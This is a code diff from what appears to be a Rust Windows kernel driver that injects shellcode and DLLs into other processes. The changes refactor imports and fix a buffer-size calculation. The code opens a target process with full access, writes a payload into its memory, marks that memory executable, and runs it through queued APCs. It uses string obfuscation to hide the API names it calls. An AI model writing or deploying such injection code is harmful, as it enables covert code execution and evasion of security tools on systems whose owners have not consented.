@@ -5,24 +5,27 @@ use {
         includes::{
             enums::KAPC_ENVIROMENT::OriginalApcEnvironment, 
             types::{
-                ZwCreateThreadExType, ZwProtectVirtualMemoryType, PKNORMAL_ROUTINE
+                ZwCreateThreadExType, PKNORMAL_ROUTINE
             }, 
-            KeInitializeApc, KeInsertQueueApc, MmCopyVirtualMemory, 
+            KeInitializeApc, KeInsertQueueApc, MmCopyVirtualMemory, ZwProtectVirtualMemory 
         }, 
         process::Process,
-        utils::{find_thread_alertable, find_zw_function, read_file, InitializeObjectAttributes, get_module_peb} 
+        utils::{
+            find_thread_alertable, find_zw_function, 
+            get_module_peb, read_file, InitializeObjectAttributes
+        } 
     }, 
     callbacks::{kernel_apc_callback, user_apc_callback}, 
     core::{ffi::c_void, mem::{size_of, transmute}, ptr::null_mut}, 
     obfstr::obfstr, 
-    shared::structs::TargetInjection,
+    shared::structs::TargetInjection, 
     wdk_sys::{
         ntddk::{
             ExAllocatePool2, IoGetCurrentProcess, ZwAllocateVirtualMemory, 
             ZwClose, ZwOpenProcess
         },
         _MODE::{KernelMode, UserMode}, *
-    }, 
+    },
 };
 
 mod callbacks;
@@ -47,23 +50,18 @@ impl InjectionShellcode {
             Some(addr) => addr as *mut c_void,
             None => return STATUS_UNSUCCESSFUL
         };
-       
-        let zw_protect_addr = match find_zw_function(obfstr!("NtProtectVirtualMemory")) {
-            Some(addr) => addr as *mut c_void,
-            None => return STATUS_UNSUCCESSFUL
-        };
 
         let target_eprocess = match Process::new(pid) {
             Some(e_process) => e_process,
             None => return STATUS_UNSUCCESSFUL,
         };
+
         let mut h_process: HANDLE = null_mut();
         let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
         let mut client_id = CLIENT_ID {
             UniqueProcess: pid as _,
             UniqueThread: null_mut(),
         };
-
         let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
         if !NT_SUCCESS(status) {
             log::error!("ZwOpenProcess Failed With Status: {status}");
@@ -74,6 +72,7 @@ impl InjectionShellcode {
             Ok(buffer) => buffer,
             Err(error) => return error
         };
+
         let mut base_address = null_mut();
         let mut region_size = shellcode.len() as u64;
         status = ZwAllocateVirtualMemory(h_process, &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -94,7 +93,6 @@ impl InjectionShellcode {
             &mut result_number,
         );
         
-        let ZwProtectVirtualMemory = transmute::<_, ZwProtectVirtualMemoryType>(zw_protect_addr);
         let mut old_protect = 0;
         status = ZwProtectVirtualMemory(h_process, &mut base_address, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
         if !NT_SUCCESS(status) {
@@ -232,11 +230,11 @@ impl InjectionShellcode {
             return STATUS_UNSUCCESSFUL;
         }
 
-        return STATUS_SUCCESS
+        STATUS_SUCCESS
     }
 }
 
-/// Represents DLL injection.
+// Represents DLL injection.
 pub struct InjectionDLL;
 
 impl InjectionDLL {
@@ -257,11 +255,6 @@ impl InjectionDLL {
             None => return STATUS_UNSUCCESSFUL
         };
 
-        let zw_protect_addr = match find_zw_function(obfstr!("NtProtectVirtualMemory")) {
-            Some(addr) => addr as *mut c_void,
-            None => return STATUS_UNSUCCESSFUL
-        };
-        
         let function_address = match get_module_peb(pid, obfstr!("kernel32.dll"),obfstr!("LoadLibraryA")) {
             Some(addr) => addr,
             None => return STATUS_UNSUCCESSFUL
@@ -271,6 +264,7 @@ impl InjectionDLL {
             Some(e_process) => e_process,
             None => return STATUS_UNSUCCESSFUL,
         };
+
         let mut h_process: HANDLE = null_mut();
         let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
         let mut client_id = CLIENT_ID {
@@ -284,7 +278,7 @@ impl InjectionDLL {
         }
 
         let mut base_address = null_mut();
-        let mut region_size = path.len() as u64;
+        let mut region_size = (path.len() * size_of::<u16>()) as u64;
         status = ZwAllocateVirtualMemory(h_process, &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if !NT_SUCCESS(status) {
             log::error!("ZwAllocateVirtualMemory Failed With Status: {status}");
@@ -303,7 +297,6 @@ impl InjectionDLL {
             &mut result_number,
         );
 
-        let ZwProtectVirtualMemory = transmute::<_, ZwProtectVirtualMemoryType>(zw_protect_addr);
         let mut old_protect = 0;
         status = ZwProtectVirtualMemory(h_process, &mut base_address, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
         if !NT_SUCCESS(status) {
